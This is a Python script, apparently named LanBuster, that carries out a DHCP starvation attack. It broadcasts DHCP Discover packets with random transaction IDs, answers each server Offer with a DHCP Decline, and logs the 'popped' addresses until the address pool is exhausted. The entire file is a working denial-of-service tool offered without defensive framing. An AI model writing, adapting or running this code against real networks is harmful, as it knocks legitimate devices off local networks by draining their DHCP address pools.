#!/usr/bin/env python3

import time
import random
import traceback
import struct
import binascii

from subprocess import check_output
from collections import OrderedDict
from socket import socket, timeout, AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, SO_BROADCAST, SO_BINDTODEVICE

from lan_buster_init import Initialize
from lan_buster_response import DHCPRequest

class LanBuster:
    def __init__(self):
        self.interface = 'enp0s3'
        self.bind_int = str(f'{self.interface}' + '\0').encode('utf-8')
        self.active_xid = set()

        self.ip_total = 254

        self.test = True

        self.popped_ips = []

    def Start(self):
        run = Initialize()
        if (run):
            try:
                self.Main()
                self.GetMac()
                self.Bust()

            except timeout:
                self.Finalize()

            except Exception:
                traceback.print_exc()
        else:
            exit(1)

    def Main(self):
        self.sock = socket(AF_INET, SOCK_DGRAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR,1)
        self.sock.setsockopt(SOL_SOCKET, SO_BROADCAST,1)
        self.sock.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, self.bind_int)
        self.sock.bind(('0.0.0.0', 68))
    
    def GetMac(self):
        output = check_output(f'ifconfig {self.interface}', shell=True).decode()
        output = output.splitlines(8)
        for line in output:       
            if('ether' in line):
                line = line.strip().split()
                mac = line[1]
                break
                
        self.mac = struct.pack('!6s', binascii.unhexlify(mac.replace(':','')))

    def Bust(self):
        Response = DHCPParser()
        while True:
            random_int = self.Rando()
            Buster = DHCPRequest(self.mac, xID=random_int, mtype=1)
            dhcp_packet = Buster.Request()
            self.sock.sendto(dhcp_packet, ('255.255.255.255', 67))
            print(f'Broadcasted Request: 255.255.255.255: 67')
            try:
                self.sock.settimeout(6)

                data, addr = self.sock.recvfrom(1024)
                xID, assigned_ip, mtype = Response.Parse(data)
                print(f'Revieced Response from {addr[0]}:{addr[1]} | MTYPE:{mtype}')
                if (mtype == 2):
                    Buster = DHCPRequest(self.mac, xID=xID, mtype=4, assigned_ip=assigned_ip)
                    dhcp_packet = Buster.Request()
                    self.sock.sendto(dhcp_packet, ('255.255.255.255', 67))
                    
                    print(f'Declined IP:{assigned_ip}')
                    self.popped_ips.append(assigned_ip)

                    if (self.test):
                        break

            except timeout:
                self.Finalize()

    def Finalize(self):
        print('Socket Timeout: IP Range is now exhausted!')

        with open('popped_ips.txt', 'w+') as lol:
            lol.write('IPs Declined\n' + '-' * 30)
            for i, ip in enumerate(self.popped_ips):
                lol.write(f'{ip}\n')

        print(f'{i}/{self.ip_total} IP Addresses Declined. All others have a leases.')

    def Rando(self):
        while True:
            random_int = random.randint(1,9999)
            if (random_int not in self.active_xid):
                self.active_xid.add(random_int)
                
                random_int = struct.pack('!L', random_int)
                
                return random_int

class DHCPParser:
    def __init__(self):
        pass

    def Parse(self, data):
        
        xID = data[4:8]
        assigned_ip = data[16:20]
        mtype = data[242]

        a_ip = struct.unpack('!4B', assigned_ip)
        assigned_ip = f'{a_ip[0]}.{a_ip[1]}.{a_ip[2]}.{a_ip[3]}'
        
        return (xID, assigned_ip, mtype)


if __name__ == '__main__':
    LB = LanBuster()
    LB.Start()
